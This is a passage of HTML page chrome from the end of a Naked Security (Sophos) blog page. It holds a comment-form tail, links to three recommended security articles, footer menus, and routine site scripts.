</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="43b02f57e4" /></p><p style="display: none !important;"><label>&#916;<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label><input type="hidden" id="ak_js" name="ak_js" value="128"/><script>document.getElementById( "ak_js" ).setAttribute( "value", ( new Date() ).getTime() );</script></p></form>	</div><!-- #respond -->
	
</div><!-- #comments -->
		<div class="comments-widget-area">
					</div>
	
	</div> <!-- .panel-container -->
	</div> <!-- .container -->
	</section> <!-- .panel -->

	

	<section class="recommended-panel">
	<div class="container">
	<div class="panel-content ">

		<h3 class="block-title">Recommended reads</h3>
	<div class="blocks">
		<article id="post-637413" class="card-slide">
	<div class="card-image">
		<div class="image-pointer"></div>
		<a href="https://nakedsecurity.sophos.com/2021/11/10/patch-tuesday-updates-the-win-7-updater-for-at-most-1-more-year-of-updates/"><div class="dynamic-image-frame">
		<div class="dynamic-image" style="background-image: url(https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/11/w7-1200.png?w=412&#038;h=200&#038;crop=1);"></div>
	</div></a>
	</div>
	<div class="card-content">
		<div class="meta-box">
			<div class="date-box">
				<span class="month">Nov</span><span class="day">10</span>
			</div>
 			<div class="author-box">
			<span class="by">by</span>
		Paul Ducklin	
	</div>
			<div class="comment-box">
				<span class="count">12</span>
			</div>
		</div>
		<h3 class="card-title"><a href="https://nakedsecurity.sophos.com/2021/11/10/patch-tuesday-updates-the-win-7-updater-for-at-most-1-more-year-of-updates/" rel="bookmark">Patch Tuesday updates the Win 7 updater&#8230; for at most 1 more year of updates</a></h3>	</div>
</article> <!-- .card-article -->
<article id="post-619407" class="card-slide">
	<div class="card-image">
		<div class="image-pointer"></div>
		<a href="https://nakedsecurity.sophos.com/2021/09/15/s3-ep50-two-0-days-plus-another-0-day-plus-a-fast-food-bug-podcast/"><div class="dynamic-image-frame">
		<div class="dynamic-image" style="background-image: url(https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/09/ns-1200-logo-podcast-with-mic.png?w=412&#038;h=200&#038;crop=1);"></div>
	</div></a>
	</div>
	<div class="card-content">
		<div class="meta-box">
			<div class="date-box">
				<span class="month">Sep</span><span class="day">15</span>
			</div>
 			<div class="author-box">
			<span class="by">by</span>
		Paul Ducklin	
	</div>
			<div class="comment-box">
				<span class="count">2</span>
			</div>
		</div>
		<h3 class="card-title"><a href="https://nakedsecurity.sophos.com/2021/09/15/s3-ep50-two-0-days-plus-another-0-day-plus-a-fast-food-bug-podcast/" rel="bookmark">S3 Ep50: Two 0-days plus another 0-day plus a fast food bug [Podcast]</a></h3>	</div>
</article> <!-- .card-article -->
<article id="post-637566" class="card-slide">
	<div class="card-image">
		<div class="image-pointer"></div>
		<a href="https://nakedsecurity.sophos.com/2021/11/18/github-cookie-leakage-thousands-of-firefox-cookie-files-uploaded-by-mistake/"><div class="dynamic-image-frame">
		<div class="dynamic-image" style="background-image: url(https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/11/cook-1220.jpg?w=412&#038;h=200&#038;crop=1);"></div>
	</div></a>
	</div>
	<div class="card-content">
		<div class="meta-box">
			<div class="date-box">
				<span class="month">Nov</span><span class="day">18</span>
			</div>
 			<div class="author-box">
			<span class="by">by</span>
		Paul Ducklin	
	</div>
			<div class="comment-box">
				<span class="count">2</span>
			</div>
		</div>
		<h3 class="card-title"><a href="https://nakedsecurity.sophos.com/2021/11/18/github-cookie-leakage-thousands-of-firefox-cookie-files-uploaded-by-mistake/" rel="bookmark">Github cookie leakage &#8211; thousands of Firefox cookie files uploaded by mistake</a></h3>	</div>
</article> <!-- .card-article -->
	</div>

	</div> <!-- .panel-container -->
	</div> <!-- .container -->
	</section> <!-- .panel -->

	
	
	<footer id="colophon" class="site-footer" role="contentinfo">
		<div class="footer-container">
			<a href="#" class="js-collapse-footer"><svg style="height: 20px" viewBox="0 0 132 24" class="block icon sophos"><use xlink:href="#sophos"></use></svg></a>
			<div id="collapseFooter" class="blocks">
				<div class="sophos block">
					<ul id="menu-footer-primary" class="primary menu"><li id="menu-item-306737" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-306737"><a href="https://nakedsecurity.sophos.com/about/">About Naked Security</a></li>
<li id="menu-item-306754" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-306754"><a href="https://www.sophos.com/en-us/company.aspx">About Sophos</a></li>
<li id="menu-item-306747" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-306747"><a href="https://nakedsecurity.sophos.com/send-us-a-tip/">Send us a tip</a></li>
<li id="menu-item-323171" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-323171"><a href="/cookies-and-scripts/">Cookies</a></li>
<li id="menu-item-323170" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-323170"><a href="https://www.sophos.com/en-us/legal/sophos-group-privacy-policy.aspx">Privacy</a></li>
<li id="menu-item-323169" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-323169"><a href="https://www.sophos.com/en-us/legal.aspx">Legal</a></li>
</ul>				</div>
										<div class="news block">
							<ul id="menu-products-column-one" class="small menu"><li id="menu-item-306998" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-306998"><a href="https://www.sophos.com/en-us/products/intercept-x.aspx">Intercept X</a></li>
<li id="menu-item-440801" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440801"><a href="https://www.sophos.com/en-us/products/server-security.aspx">Intercept X for Server</a></li>
<li id="menu-item-440802" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440802"><a href="https://www.sophos.com/en-us/products/mobile-control.aspx">Intercept X for Mobile</a></li>
</ul>						</div>
											<div class="products block">
							<ul id="menu-products-column-two" class="small menu"><li id="menu-item-440803" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440803"><a href="https://www.sophos.com/en-us/products/next-gen-firewall.aspx">XG Firewall</a></li>
<li id="menu-item-440805" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440805"><a href="https://www.sophos.com/en-us/products/sophos-email.aspx">Sophos Email</a></li>
<li id="menu-item-440804" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440804"><a href="https://www.sophos.com/en-us/products/secure-wifi.aspx">Sophos Wireless</a></li>
</ul>						</div>
											<div class="threats block">
							<ul id="menu-server-protection" class="small menu"><li id="menu-item-440806" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440806"><a href="https://www.sophos.com/en-us/products/managed-threat-response.aspx">Managed Threat Response</a></li>
<li id="menu-item-448404" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-448404"><a href="https://www.sophos.com/en-us/products/cloud-optix.aspx">Cloud Optix</a></li>
<li id="menu-item-440807" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440807"><a href="https://www.sophos.com/en-us/products/phish-threat.aspx">Phish Threat</a></li>
</ul>						</div>
								</div>
			<ul class="block social footer">
				<li class="twitter"><a rel="nofollow" href="https://twitter.com/NakedSecurity" title="Follow our team of security experts on Twitter"><svg style="height: 14px" viewBox="0 0 100 100" class="icon twitter"><use xlink:href="#twitter"></use></svg></a></li>
				<li class="facebook"><a rel="nofollow" href="https://www.facebook.com/SophosSecurity" title="Join over 250,000 people in our Facebook community"><svg style="height: 14px" viewBox="0 0 100 100" class="icon facebook"><use xlink:href="#facebook"></use></svg></a></li>
				<li class="instagram"><a rel="nofollow" href="https://www.instagram.com/nakedsecurity/" title="Follow Naked Security on Instagram"><svg style="height: 14px" viewBox="0 0 100 100" class="icon instagram"><use xlink:href="#instagram"></use></svg></a></li>
				<li class="linkedin"><a rel="nofollow" href="https://www.linkedin.com/company/5053/" title="Join the naked security discussion group on LinkedIn"><svg style="height: 14px" viewBox="0 0 100 100" class="icon linkedin"><use xlink:href="#linkedin"></use></svg></a></li>
				<li class="rss"><a rel="nofollow" href="/feed" title="Subscribe to our RSS feed"><svg style="height: 14px" viewBox="0 0 100 100" class="icon rss"><use xlink:href="#rss"></use></svg></a></li>
			</ul>

							<div class="vip-powered-wpcom">
					<span class="copyright">© 1997 - 2021 Sophos Ltd.</span>
					All rights reserved.
					Powered by <a href="https://wpvip.com/?utm_source=vip_powered_wpcom&#038;utm_medium=web&#038;utm_campaign=VIP%20Footer%20Credit&#038;utm_term=nakedsecurity.sophos.com" rel="generator nofollow" class="powered-by-wpcom">WordPress VIP</a>				</div>
					</div>
		<script type="text/javascript">
			window.cookieconsent_options = {
				"message":"This site uses cookies. By continuing to browse the site you are agreeing to our use of cookies.",
				"dismiss":"Got it!",
				"learnMore":"Learn More",
				"link":"/cookies-and-scripts",
				"theme":"https://nakedsecurity.sophos.com/wp-content/themes/sophosnews-2015/css/sophos.css"};
		</script>
	</footer><!-- #colophon -->
</div><!-- #page -->
<div id="survey-wrapper" class="mfp-hide"><div class="pd-embed" id="pd_1499706777" data-settings=""></div></div>
<script type="text/javascript" src="https://nakedsecurity.sophos.com/_static/??-eJzTLy/QTc7PK0nNK9EvyClNz8wr1i+uzCtJrMjITM/IAeKS1CJMEWP94uSizIISoOIM5/yiVL2sYh19yo1yKioFmldQQE3jAnISM/OoaaBXYlki0Dz7XFtDM2MLSwMDCzPDLADw837w" ></script><script type='text/javascript'>
	(function(){
		var corecss = document.createElement('link');
		var themecss = document.createElement('link');
		var corecssurl = "https://nakedsecurity.sophos.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b";
		if ( corecss.setAttribute ) {
				corecss.setAttribute( "rel", "stylesheet" );
				corecss.setAttribute( "type", "text/css" );
				corecss.setAttribute( "href", corecssurl );
		} else {
				corecss.rel = "stylesheet";
				corecss.href = corecssurl;
		}
		document.head.appendChild( corecss );
		var themecssurl = "https://nakedsecurity.sophos.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeDefault.css?ver=3.0.9b";
		if ( themecss.setAttribute ) {
				themecss.setAttribute( "rel", "stylesheet" );
				themecss.setAttribute( "type", "text/css" );
				themecss.setAttribute( "href", themecssurl );
		} else {
				themecss.rel = "stylesheet";
				themecss.href = themecssurl;
		}
		document.head.appendChild( themecss );
	})();
	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
	SyntaxHighlighter.config.strings.help = '?';
	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
	SyntaxHighlighter.defaults['toolbar'] = false;
	SyntaxHighlighter.all();

	// Infinite scroll support
	if ( typeof( jQuery ) !== 'undefined' ) {
		jQuery( function( $ ) {
			$( document.body ).on( 'post-load', function() {
				SyntaxHighlighter.highlight();
			} );
		} );
	}
</script>
<script id='child-js-plugins-js-extra'>
var PG8Data = {"startPage":"1","maxPages":"0","nextLink":""};
</script>
<script id='child-js-core-js-extra'>
var Sophos = {"ajaxurl":"https:\/\/nakedsecurity.sophos.com\/wp-admin\/admin-ajax.php","nonce":"8bbdaf03d3"};
</script>
<script type="text/javascript" src="https://nakedsecurity.sophos.com/_static/??-eJyNi0EOhCAQBD8kjmgw8WD8izBZIcxAHIzx9xKze9uDx66ugjMrm7ggFygbEgpIylsSxlNU32kDQSDH4+NZ2iANvAps2vFne7bxcNV7OFEt1Y45Xi15/ifVibSi+/4LzXocJqO7cTLhBn25Pv0=" ></script><script src='https://stats.wp.com/e-202150.js' defer></script>
<script>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:10.4',blog:'166161173',post:'647469',tz:'0',srv:'nakedsecurity.sophos.com'} ]);
	_stq.push([ 'clickTrackerInit', '166161173', '647469' ]);
</script>
</body>
</html>
